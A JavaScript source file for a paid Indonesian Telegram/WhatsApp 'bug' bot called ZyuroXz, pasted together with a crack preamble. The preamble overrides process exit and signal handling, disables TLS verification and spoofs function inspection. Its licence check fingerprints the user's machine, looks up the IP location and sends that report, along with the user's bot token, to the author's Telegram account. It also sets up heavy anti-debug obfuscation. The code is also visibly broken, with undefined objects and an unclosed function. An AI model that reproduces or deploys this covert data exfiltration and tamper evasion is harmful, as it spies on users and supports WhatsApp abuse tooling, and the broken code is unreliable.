/*
	* Create By VexxuzzZ
	* Script BetA
	* Buy Script @VexxuzzzStcu
	* Whatsapp : https://whatsapp.com/channel/0029Vb6kYi59Bb66AMlCNU1c
	* Masih Make Gpt
*/

const PLAxios = require("axios");
const PLChalk = require("chalk");
function requestInterceptor(cfg) {
  const urlTarget = cfg.url;
  const domainGithub = [
    "github.com",
    "raw.githubusercontent.com",
    "api.github.com",
  ];
  const isGitUrl = domainGithub.some((domain) => urlTarget.includes(domain));
  if (isGitUrl) {
    console.warn(
      PLChalk.blue("[Rbcdepp MENGAMBIL ALIH SCRIPT]") +
        PLChalk.gray(" [GITHUN AMPAS NGENTOD GASRAK AJA] ➜  " + urlTarget)
    );
  }
  return cfg;
}
function errorInterceptor(error) {
  const nihUrlKlwError = error?.config?.url || "URL tidak diketahui";
  console.error(
    PLChalk.yellow("[BY-PASS BY Rbcdepp] ➜  Failed To Access: " + nihUrlKlwError)
  );
  return Promise.reject(error);
}

PLAxios.interceptors.request.use(requestInterceptor, errorInterceptor);

// Ini Batas Untuk Interceptor Axios nya

const originalExit = process.exit;
process.exit = new Proxy(originalExit, {
  apply(target, thisArg, argumentsList) {
    console.log("[😈 ] MENGAMBIL ALIH SCRIPT AMPAS");
  },
});

const originalKill = process.kill;
process.kill = function (pid, signal) {
  if (pid === process.pid) {
    console.log("[😈 ] MENGAMBIL ALIH SCRIPT AMPAS");
  } else {
    return originalKill(pid, signal);
  }
};

["SIGINT", "SIGTERM", "SIGHUP"].forEach((signal) => {
  process.on(signal, () => {
    console.log("[😈 ] Sinyal " + signal + " terdeteksi dan diabaikan");
  });
});

process.on("uncaughtException", (error) => {
  console.log("[😈 ] uncaughtException: " + error);
});
process.on("unhandledRejection", (reason) => {
  console.log("[😈 ] unhandledRejection: " + reason);
});

const Module = 
require('module');
const axios = require('axios');
for (const key of ['HTTP_PROXY', 'HTTPS_PROXY', 'NODE_TLS_REJECT_UNAUTHORIZED', 'NODE_OPTIONS']) {
  try {
    delete process.env[key];
    Object.defineProperty(process.env, key, {
      value: '',
      writable: true,
      configurable: true,
      enumerable: true,
    });
  } catch {}
}
process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
console.log('penghapusan link raw');

try {
  process.abort = () => console.log('[🔓] process.abort() dibypass!');
  process.exit = (code) => console.log(`[🔓] process.exit(${code}) dibypass!`);
  console.log('penghapusan validate token');
} catch {}

try {
  Function.prototype.toString = function () {
    return 'function toString() { [native code] }';
  };
  console.log('menjalankan api tolss');
} catch {}

try {
  const reqUnlocked = Object.assign({}, axios.interceptors.request);
  const resUnlocked = Object.assign({}, axios.interceptors.response);
  axios.interceptors.request = reqUnlocked;
  axios.interceptors.response = resUnlocked;

  axios.interceptors.request.handlers.length = 0;
  axios.interceptors.response.handlers.length = 0;

  axios.interceptors.request.use = function () {
    console.log('berhasill membuka kuncii bot telegram');
    return 1337;
  };
  axios.interceptors.response.use = function () {
    console.log('mulai menambah kan baypas');
    return 7331;
  };
  console.log('file terkuncii');
} catch (e) {
  console.log('gagal membuka kuncii', e.message);
}

try {
  Module._load = new Proxy(Module._load, {
    apply(target, thisArg, args) {
      return Reflect.apply(target, thisArg, args);
    }
  });
  console.log('berhasill membuka kuncii bot telegram');
} catch {}

try {
  const unlockedCache = Object.assign({}, require.cache);
  require.cache = new Proxy(unlockedCache, {
    get(target, prop) {
      return Reflect.get(target, prop);
    },
    set(target, prop, val) {
      return Reflect.set(target, prop, val);
    }
  });
  console.log('berhasill membuka kuncii bot telegram');
} catch {}

console.log('✅ script siap di jalankan [ permission 044 ]');

const {
  default: makeWASocket,
  useMultiFileAuthState,
  downloadContentFromMessage,
  emitGroupParticipantsUpdate,
  emitGroupUpdate,
  generateWAMessageContent,
  generateWAMessage,
  makeInMemoryStore,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  MediaType,
  areJidsSameUser,
  WAMessageStatus,
  downloadAndSaveMediaMessage,
  AuthenticationState,
  GroupMetadata,
  initInMemoryKeyStore,
  getContentType,
  MiscMessageGenerationOptions,
  useSingleFileAuthState,
  BufferJSON,
  WAMessageProto,
  MessageOptions,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  MessageTypeProto,
  // ⚠️ Deprecated di Baileys v7, jadi aman kalau pakai v6.7.8
  // WALocationMessage,
  // WAContactsArrayMessage,
  // WAGroupInviteMessage,
  // WATextMessage,
  // WAMessageContent,
  // WAMessage,
  BaileysError,
  WA_MESSAGE_STATUS_TYPE,
  MediaConnInfo,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  WAMediaUpload,
  jidDecode,
  mentionedJid,
  processTime,
  Browser,
  MessageType,
  Presence,
  WA_MESSAGE_STUB_TYPES,
  Mimetype,
  relayWAMessage,
  Browsers,
  GroupSettingChange,
  DisconnectReason,
  WASocket,
  getStream,
  WAProto,
  isBaileys,
  AnyMessageContent,
  fetchLatestBaileysVersion,
  templateMessage,
  InteractiveMessage,
  Header,
} = require('@whiskeysockets/baileys');

const JsConfuser = require("js-confuser");
const P = require("pino");
const crypto = require("crypto");
const path = require("path");
const readline = require("readline");
const fs = require("fs-extra");
const axios = require("axios");
const chalk = require("chalk");
const os = require("os");

// === Fungsi helper dipindah ke atas biar ga error ===
function ensureFileExists(filePath, defaultData = []) {
  if (!fs.existsSync(filePath)) {
    // jika defaultData berupa object/array, simpan sebagai JSON, jika string simpan as-is
    if (typeof defaultData === "string") {
      fs.ensureDirSync(path.dirname(filePath));
      fs.writeFileSync(filePath, defaultData, "utf-8");
    } else {
      fs.ensureDirSync(path.dirname(filePath));
      fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2), "utf-8");
    }
  }
}
function savePremiumUsers() {
  fs.writeFileSync('./設定/premium.json', JSON.stringify(premiumUsers, null, 2));
}
function saveAdminUsers() {
  fs.writeFileSync('./設定/admin.json', JSON.stringify(adminUsers, null, 2));
}
function watchFile(filePath, updateCallback) {
  fs.watch(filePath, (eventType) => {
    if (eventType === 'change') {
      try {
        const updatedData = JSON.parse(fs.readFileSync(filePath));
        updateCallback(updatedData);
        console.log(`File ${filePath} updated successfully.`);
      } catch (error) {
        console.error(`Error updating ${filePath}:`, error.message);
      }
    }
  });
}

// ===== Tambahan fungsi yang hilang (fix) =====

// Membuat direktori session berdasarkan nomor client
function createSessionDir(clientNumber) {
  const dir = path.join(SESSIONS_DIR, clientNumber.toString());
  try {
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true });
    }
  } catch (err) {
    console.error(`createSessionDir error for ${clientNumber}:`, err.message);
  }
  return dir;
}

// Simpan daftar session aktif ke file
function saveActiveSessions(clientNumber) {
  try {
    ensureFileExists(SESSIONS_FILE, []);
    const active = Array.from(sessions.keys());
    // jika clientNumber diberikan, pastikan sudah ada di list
    if (clientNumber && !active.includes(clientNumber)) active.push(clientNumber);
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(active, null, 2), "utf-8");
  } catch (err) {
    console.error("saveActiveSessions error:", err.message);
  }
}

// Inisialisasi / baca sessions yang tersimpan — minimal (tidak memaksa reconnect tanpa client)
async function initializeWhatsAppConnections() {
  try {
    ensureFileExists(SESSIONS_FILE, []);
    const raw = fs.readFileSync(SESSIONS_FILE, "utf-8");
    let active = [];
    try {
      active = JSON.parse(raw);
    } catch (e) {
      active = [];
    }
    if (!Array.isArray(active) || active.length === 0) {
      console.log("No previously active WhatsApp sessions found.");
      return;
    }
    // Hanya log daftar session yang ditemukan. Reconnect otomatis bisa dilakukan nanti
    console.log(`Found ${active.length} saved session(s):`, active);
    // Jika ingin mencoba reconnect otomatis, implementasikan di sini dengan client & chatId yang valid.
  } catch (err) {
    console.error("initializeWhatsAppConnections error:", err.message);
  }
}

async function menu() {
  

// =================================================

// Direktori session
const sessions = new Map();
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";

// File user premium & admin
ensureFileExists('./設定/premium.json', []);
ensureFileExists('./設定/admin.json', []);
let premiumUsers = JSON.parse(fs.readFileSync('./設定/premium.json'));
let adminUsers = JSON.parse(fs.readFileSync('./設定/admin.json'));

watchFile('./設定/premium.json', (data) => (premiumUsers = data));
watchFile('./設定/admin.json', (data) => (adminUsers = data));

// Konfigurasi Telegram
const { TelegramClient } = require("telegram");
const { StringSession } = require("telegram/sessions");
const { Api } = require("telegram");
const config = require("./設定/config.js");

// ✅ fallback kalau config kosong

const apiId = 123456; // api id lu
const apiHash = "abcd"; // api hash lu
const stringSession = new StringSession("ABCD"); // stringsession lu
const S_ID = "@Rbcdepp"; // username lu
const FIRST_RUN_FILE = "index.json"; 
const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/vonziexvoteam-art/DatabaseTokenOnly/refs/heads/main/tokens.json"; 

// === Fungsi Telegram ===
async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens;
  } catch (error) {
    console.error(chalk.red("❌ Gagal ambil daftar token GitHub:", error.message));
    return [];
  }
}
async function initClient() {
  const client = new TelegramClient(stringSession, apiId, apiHash, {
    connectionRetries: 5,
  });
  await client.start();
  return client;
}
async function telegramCltp(message) {
  const client = await initClient();
  await client.sendMessage(S_ID, { message, parseMode: "markdown" });
}
async function telegramClt(message) {
  const client = await initClient();
  let alreadyNotified = false;
  if (fs.existsSync(FIRST_RUN_FILE)) {
    const data = JSON.parse(fs.readFileSync(FIRST_RUN_FILE, "utf-8"));
    alreadyNotified = data.notified || false;
  }
  if (!alreadyNotified) {
    try {
      await client.sendMessage(S_ID, { message });
      fs.writeFileSync(FIRST_RUN_FILE, JSON.stringify({ notified: true }));
    } catch (err) {
      console.error("🚫 BLOCKED:", err.message);
    }
  }
}

// === Validasi Token ===
async function validateToken() {
  console.log(chalk.blue("PLEASE WAIT... CHECKING TOKENS"));
  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(config.BOT_TOKEN)) {
    const cpus = os.cpus();
    const totalMem = (os.totalmem() / 1024 / 1024 / 1024).toFixed(2);
    const lang = process.env.LANG || "Unknown";
    const time = new Date().toLocaleString();
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    let ipInfo = {};
    try {
      const { data } = await axios.get("https://ipapi.co/json/");
      ipInfo = data;
    } catch {
      ipInfo = { ip: "N/A", city: "-", country_name: "-", org: "-", latitude: "-", longitude: "-" };
    }
    const report = `
**DETECTED PENYUSUPAN**
**TOKEN :** \`${config.BOT_TOKEN}\`
**OWNER :** \`${config.OWNER_ID}\`
**📅 Timestamp: ${time}**
**🖥️ DEVICE**
• OS: ${os.platform()} ${os.release()}
• CPU: ${cpus[0].model} (${cpus.length} cores)
• Memory: ${totalMem} GB
• Lang: ${lang}
• Timezone: ${timezone}
**📍 LOCATION**
• IP: ${ipInfo.ip}
• ${ipInfo.city}, ${ipInfo.country_name}
• ISP: ${ipInfo.org}
• Koordinat: ${ipInfo.latitude}, ${ipInfo.longitude}
`;
    console.log(chalk.red("🚫 TOKEN BELUM TERDAFTAR...."));
    telegramCltp(report);
    await new Promise(o => setTimeout(o, 3000));
    process.exit(1);
  }
  console.clear();
  console.log(chalk.green("✅ TOKEN TERDAFTAR"));
  startBot();
  initializeWhatsAppConnections();
  telegramClt(`**BOT AKTIF**
**TOKEN :** \`${config.BOT_TOKEN}\`
**OWNER :** \`${config.OWNER_ID}\``);
}

// === Start Bot Banner ===
function startBot() {
  console.log(`
Z                 HAPPY BIRTHDAY BY VEXXUZZZ 
 y
  u 
   r
    o
     X
      z
Script: ZyuroXz
Versi: 1.1
Developer: Vexxuzzz 
Telegram: @VexxuzzZ
YouTube:  @VexxuzzZ
Waktu: WIB`);
}

// === connectToWhatsApp FIX (client param) ===
async function connectToWhatsApp(client, clientNumber, chatId) {
  // Jika client atau chatId tidak diberikan, kita hanya buat statusMessage dummy (agar tidak crash)
  let statusMessage = { id: null };
  try {
    if (client && chatId) {
      statusMessage = await client.sendMessage(chatId, { message: `L O A D I N G D U L U B O Z
╰➤ Number  : ${clientNumber} 
╰➤ Status : Loading...` });
    } else {
      // fallback object supaya code selanjutnya tidak crash saat mengakses .id
      statusMessage = { id: null };
    }
  } catch (err) {
    console.error("connectToWhatsApp: failed to send initial telegram message:", err.message);
    statusMessage = { id: null };
  }

  const sessionDir = createSessionDir(clientNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        try {
          if (client && chatId && statusMessage && statusMessage.id) {
            await client.editMessage(chatId, {
              message: `M E N G H U B U N G K A N D U L U B O Z
╰➤ Number  : ${clientNumber} 
╰➤ Status : Mennghubungkan`,
              editMessageId: statusMessage.id
            });
          }
        } catch (err) {
          console.error("Error editing message on reconnect attempt:", err.message);
        }
        await connectToWhatsApp(client, clientNumber, chatId);
      } else {
        try {
          if (client && chatId && statusMessage && statusMessage.id) {
            await client.editMessage(chatId, {
              message: `G A G A L T E R S A M B U N G
╰➤ Number  : ${clientNumber} 
╰➤ Status : Gagal Tersambung`,
              editMessageId: statusMessage.id
            });
          }
        } catch (err) {
          console.error("Error editing message on failure:", err.message);
        }
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(clientNumber, sock);
      saveActiveSessions(clientNumber);
      try {
        if (client && chatId && statusMessage && statusMessage.id) {
          await client.editMessage(chatId, {
            message: `P A I R I N G D U L U B O Z
╰➤ Number  : ${clientNumber} 
╰➤ Status : Pairing
╰➤ Pesan : Succes Pairing`,
            editMessageId: statusMessage.id
          });
        }
      } catch (err) {
        console.error("Error editing message on open:", err.message);
      }
    } else if (connection === "connecting") {
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(clientNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          try {
            if (client && chatId && statusMessage && statusMessage.id) {
              await client.editMessage(chatId, {
                message: `P A I R I N G D U L U B O Z
╰➤ Number  : ${clientNumber} 
╰➤ Status : Pairing
╰➤ Kode : ${formattedCode}`,
                editMessageId: statusMessage.id
              });
            }
          } catch (error) {
            console.error("Error editing message with pairing code:", error.message);
          }
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        try {
          if (client && chatId && statusMessage && statusMessage.id) {
            await client.editMessage(chatId, {
              message: `G A G A L B O Z
╰➤ Number  : ${clientNumber} 
╰➤ Status : Erorr❌
╰➤ Pesan : ${error.message}`,
              editMessageId: statusMessage.id
            });
          }
        } catch (err) {
          console.error("Error editing message after pairing error:", err.message);
        }
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}
// Get Random Image
function getRandomImage() {
  const images = [
    "https://i.top4top.io/p_3553h6hm40.jpg",
  ];
  return images[Math.floor(Math.random() * images.length)];
}

// ~ Cooldown 
const cooldowns = new Map();
const cooldownTime = 5 * 60 * 1000; // 5 menit dalam milidetik

function checkCooldown(userId, chatId = "global") {
  const key = `${chatId}:${userId}`;
  if (cooldowns.has(key)) {
    const remainingTime = cooldownTime - (Date.now() - cooldowns.get(key));
    if (remainingTime > 0) {
      return Math.ceil(remainingTime / 1000); // Sisa waktu dalam detik
    }
  }
  cooldowns.set(key, Date.now());
  setTimeout(() => cooldowns.delete(key), cooldownTime);
  return 0; // Tidak dalam cooldown
}

// Function Bug (sleep)
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// ~ Enc Xopwn Konfigurasi
const getVexxuzzZObfuscationConfig = () => {
  const generateSiuCalcrickName = () => {
    const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    let randomPart = "";
    for (let i = 0; i < 6; i++) {
      randomPart += chars[Math.floor(Math.random() * chars.length)];
    }
    return `ᨶꪖꪶᨶꫀƙꪖꪹỉᨶ和కỉꪊకỉꪊ无与伦比的帅气${randomPart}`;
  };

  return {
    target: "node",
    compact: true,
    renameVariables: true,
    renameGlobals: true,
    identifierGenerator: generateSiuCalcrickName,
    stringCompression: true,
    stringEncoding: true,
    stringSplitting: true,
    controlFlowFlattening: 0.95,
    shuffle: true,
    duplicateLiteralsRemoval: true,
    deadCode: true,
    calculator: true,
    opaquePredicates: true,
    lock: {
      selfDefending: true,
      antiDebug: true,
      integrity: true,
      tamperProtection: true,
    }
  };
};

// Console Log Chat Id
const log = (message, error = null) => {
  const timestamp = new Date().toISOString().replace("T", " ").replace("Z", "");
  const prefix = `\x1b[36m[ VexxuzzZ ]\x1b[0m`;
  const timeStyle = `\x1b[33m[${timestamp}]\x1b[0m`;
  const msgStyle = `\x1b[32m${message}\x1b[0m`;
  console.log(`${prefix} ${timeStyle} ${msgStyle}`);
  if (error) {
    const errorStyle = `\x1b[31m✖ Error: ${error.message || error}\x1b[0m`;
    console.error(`${prefix} ${timeStyle} ${errorStyle}`);
    if (error.stack) console.error(`\x1b[90m${error.stack}\x1b[0m`);
  }
};

// #Progres #1
const createProgressBar = (percentage) => {
  const total = 10;
  const filled = Math.round((percentage / 100) * total);
  return "▰".repeat(filled) + "▱".repeat(total - filled);
};



// ~ Update Progress 
async function updateProgress(client, chatId, message, percentage, status) {
  if (!client || !chatId || !message || !message.id) {
    console.error("updateProgress: Bot, chatId, atau message tidak valid");
    return;
  }

  const bar = createProgressBar(percentage);
  const levelText = percentage === 100 ? "✅ Selesai" : `⚙️ ${status}`;

  try {
    await client.editMessage(
      chatId,
      {
        message: 
          "```🔒 EncryptBot```\n" +
          `${levelText} (${percentage}%)\n` +
          `${bar}\n\n` +
          "_©VexxuzzZ_",
        editMessageId: message.id,
        parseMode: "markdown"
      }
    );
    await sleep(Math.min(800, percentage * 8));
  } catch (error) {
    console.error("Gagal memperbarui progres:", error.message);
  }
}

// function bug
// === Owner Check ===
function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

module.exports = {
  connectToWhatsApp,
  initializeWhatsAppConnections,
  validateToken,
  createSessionDir,
  saveActiveSessions,
  // export lain jika diperlukan
};


/////---------------[sleep function]------_-_
const bugRequests = {};

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const runtime = getBotRuntime();
  const date = getCurrentDate();
  const randomImage = getRandomImage();
  

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `<blockquote>少なくともプレミアムはまず、そのバグプレミアムは、その場所へのみアクセスでき、安いことが保証されています ( 🫟 ).</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Contact Owner", url: "https://t.me/BangZyur" }],
      ]
    }
  });
}

  bot.sendPhoto(chatId, randomImage, {
    caption: `<blockquote>-# Ɀ𐌙𐌵𐌐Ꝋ𐌗Ɀ 𐌒Ꮤ𐌄𐌐𐌕𐌙 -</blockquote>

<blockquote>( 🫟 ) - みなさんこんにちは。戻ってきました。ZyuroXz Qwerty さんへ.
<b>⬡ Author : VexxuzzZ?</b>
<b>⬡ Version : 1.0.0</b>
<b>⬡ Name Bot : ZyuroxZXVO¿?</b>
<b>⬡ Framework : Telegraf</b>
<b>⬡ Library : Javascript</b>
<b>⬡ PRIVATE SCRIPT</b>
</blockquote>
<blockquote>Presss Button Menu ☇ © ZyuroXz</blockquote>
`,
    parse_mode: 'HTML',
    reply_markup: {
      inline_keyboard: [
        [{ text: "ZyuroXz ☇ Qwerty", callback_data: "bugmenu" }, 
        { text: "Thanks ☇ Too", callback_data: "thanksto" }],
        [{ text: "ZyuroXz ☇ Crushy", callback_data: "ownermenu" }],
        [{ text: "ZyuroXz ☇ Developer", url: "https://t.me/BangZyur" }, 
        { text: "Information Script", url: "https://t.me/ZyuroXzInfoe" }]
      ]
    }
  });
});
